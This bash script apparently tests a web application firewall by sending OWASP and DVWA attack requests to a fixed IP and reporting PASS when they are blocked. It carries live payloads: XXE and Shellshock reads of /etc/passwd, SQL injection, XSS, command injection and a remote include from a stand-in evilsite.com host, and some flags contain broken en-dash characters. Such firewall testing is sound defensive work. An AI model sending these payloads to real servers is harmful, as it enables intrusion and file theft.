!/usr/bin/env bash

HOST=217.14.62.112
CARGS='-A Zabbix -k -s'
GREPA='Access\|Forbidden\|Transaction\|Reason\|Blocked\|blocked'
GREPP='grep -q'
RFQDN=ya.ru

##### OWASP #####

OWAS_BA () {
echo -n "OWASP Top 10 A01:2021 – Broken Access Control :  "
if curl $CARGS https://$HOST/.git/HEAD | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWAS_BA

OWASP_CF () {
echo -n "OWASP Top 10 A02:2021 - Cryptographic Failures :  "
if curl $CARGS https://$HOST/ | $GREPP html
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_CF

OWASP_SI () {
echo -n "OWASP Top 10 A03:2021 – Injection :  "
if curl $CARGS https://$HOST/?q=/bin/pwd | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_SI

OWASP_SM () {
echo -n "OWASP Top 10 A05:2021 - Security Misconfiguration :  "
if curl $CARGS https://$HOST/admin/ | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
OWASP_SM

OWASP_XMLEE () {
echo -n "OWASP Top 10 A04:2017 - XML External Entities (XXE) :  "
if curl $CARGS –X POST https://$HOST \
-H 'Content-type: application/xml' \
-d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<Check><prod>&xxe;</prod></Check>' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_XMLEE

OWASP_BXXE () {
echo -n "OWASP Top 10 A06:2021 - Vulnerable and Outdated Components :  "
if curl $CARGS –X POST https://$HOST \
-H 'Content-type: application/xml' \
-d '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_BXXE

OWASP_DS () {
echo -n "OWASP Top 10 A08:2021 – Software and Data Integrity Failures :  "
### OWASP Top 10 A08:2017 - Insecure Deserialization
if curl $CARGS https://$HOST/?q=%7B%22username%22%3A%271%27or%271%27%3D%271%22%2C+%22attack_type%22%3A+%22deserialization%22%7D | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_DS

OWASP_SSRF () {
echo -n "OWASP Top 10 A10:2021 – Server-Side Request Forgery :  "
if curl $CARGS https://$HOST \
-H 'Referer: https://$RFQDN/' \
-d 'test=file:///etc/passwd' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
OWASP_SSRF

##### DVWA #####

DVWA_SQLI () {
echo -n "SQL Injection (SQLi) :  "
if curl $CARGS https://$HOST/DVWA/?q='+or+1=1+--' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_SQLI

DVWA_XSS () {
echo -n "Cross Site Scripting (XSS) :  "
if curl $CARGS https://$HOST/DVWA/status?q=%3Cscript%3Ealert\(1\) | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_XSS

DVWA_LFI () {
echo -n "Local File Inclusion :  "
if curl $CARGS https://$HOST/DVWA/.git/HEAD | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_LFI

DVWA_RFI () {
echo -n "Remote File Inclusion :  "
if curl $CARGS https://$HOST/DVWA/?rfi=https://$RFQDN/ | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_RFI

DVWA_PHPI () {
echo -n "PHP Code Injection :  "
if curl $CARGS https://$HOST/DVWA/?page=http://evilsite.com/evilcode.php | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_PHPI

DVWA_PROXY () { 
echo -n "HTTProxy :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Proxy: AFFECTED' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_PROXY

DVWA_SHELLSH () {
echo -n "ShellShock :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'User-Agent: () { test;}; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd' \
–H 'Host: www.example.ru'  | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_SHELLSH

DVWA_SHELLIN () {
echo -n "Shell Injection :  "
if curl $CARGS https://$HOST/DVWA/?q=/bin/who | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_SHELLIN

DVWA_BOT () {
echo -n "Scripting/Scanner/Bot Detection :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'User-Agent: Mozilla/5.0 zgrab/0.x' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_BOT

DVWA_LEAK () {
echo -n "Data Leakage Attack :  "
if curl $CARGS -X POST https://$HOST/DVWA/login.php \
-H 'Host: www.example.ru' \
-H 'Referer: http://www.example.ru' \
-d '{username: admin; password: password;}' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_LEAK

DVWA_BADH () {
echo -n "Prohibited Headers Attack :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Host: www.example.ru ' \
-H 'Referer: http://www.example.ru' \
-H 'Prohibited-Header: hello' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_BADH

DVWA_MIME () {
echo -n "MIME Types Attack :  "
if curl $CARGS -X POST https://$HOST/DVWA/ \
-H 'Host: www.example.ru' \
-H 'Referer: http:// www.example.ru' \
-H 'Content-type: some/prohibited-MIME-type' \
-d '{"some": "data"}' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_MIME

DVWA_CLV () {
echo -n "Content-length Validation :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Content-length: 0' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_CLV

DVWA_TEV () {
echo -n "Transfer-encoding Validation :  "
if curl $CARGS -X POST https://$HOST/DVWA/ \
-H 'Host: www.example.ru' \
-H 'Referer: http://www.example.ru' \
-H 'Content-type: application/json' \
-H 'Transfer-encoding: chunked' \
-d '{"some": "data"}' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
## 
}
DVWA_TEV

DVWA_RANGE () {
echo -n "Range Validation :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Host: www.example.ru' \
-H 'Referer: http:// www.example.ru' \
-H 'Range: bytes=0-10, 11-20, 21-30, 31-40, 41-50, 51-60' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_RANGE

DVWA_METHOD () {
echo -n "Method Validation :  "
if curl $CARGS -X FORBIDDEN-METHOD https://$HOST/DVWA/ \
-H 'Host: www.example.ru' \
-H 'Referer: http://www.example.ru' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_METHOD

DVWA_REFERER () {
echo -n "Referer Validation :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Host: www.example.ru' \
-H 'Referer: http://реферер' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_REFERER

DVWA_CSFR () {
echo -n "CSRF :  "
if curl $CARGS -X POST https://$HOST/DVWA/login.php \
-d '{"login":"admin", "password":"password"}' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
###
}
DVWA_CSFR

DVWA_BADJSON () {
echo -n "Bad JSON :  "
if curl $CARGS https://$HOST/DVWA/ \
-H 'Origin: https://www.example.ru' \
-H 'Host: www.example.ru' \
-d '{ :test; password' | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_BADJSON

DVWA_BADREDIR () {
echo -n "Bad Redirect :  "
if curl $CARGS https://$HOST/DVWA/redirect.php?goto=https://$RFQDN/ | $GREPP $GREPA
  then
   echo "Test PASS"
  else
   echo "Test FAIL"
fi
### 
}
DVWA_BADREDIR
